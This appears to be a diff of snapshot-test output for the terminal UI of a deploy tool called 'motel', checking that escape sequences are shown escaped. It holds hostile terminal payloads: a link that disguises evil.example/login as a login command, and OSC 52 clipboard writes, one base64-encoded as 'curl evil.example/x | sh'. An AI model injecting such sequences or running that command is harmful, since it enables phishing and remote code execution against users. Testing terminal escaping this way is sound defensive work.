@@ -1,5 +1,5 @@
 motel · deploy.example.com · v0.7.0 │ alice@example.com · viewer … live · 0s ago
-apps › hostile › deploy v7
+apps › hostile › deploy v7                           as of 14:12:40 UTC · 0s ago
 ✖ FAILED in starting after 20 s · 13:02:20 → 13:02:40 UTC
 by          ci:\x1b]8;;https://evil.example/login\x1b\motel login\x1b]8;;\x1b\ …
 serves now  v6 (as of 14:12:40 UTC)
@@ -21,4 +21,4 @@ clear \x1b[2J\x1b[H end
 csi \x1b[5A\x1b[2K\x1b[10C end
 dcs \x1bPtmux;\x1b\x1b]52;c;Y3VybA==\x07\x1b\ end
 osc52 \x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07 end
-↑↓ scroll  w wrap  p previous  n next  esc back  q quit
+↑↓ scroll  w wrap  p previous  n next  y json  c command  esc back  ? more
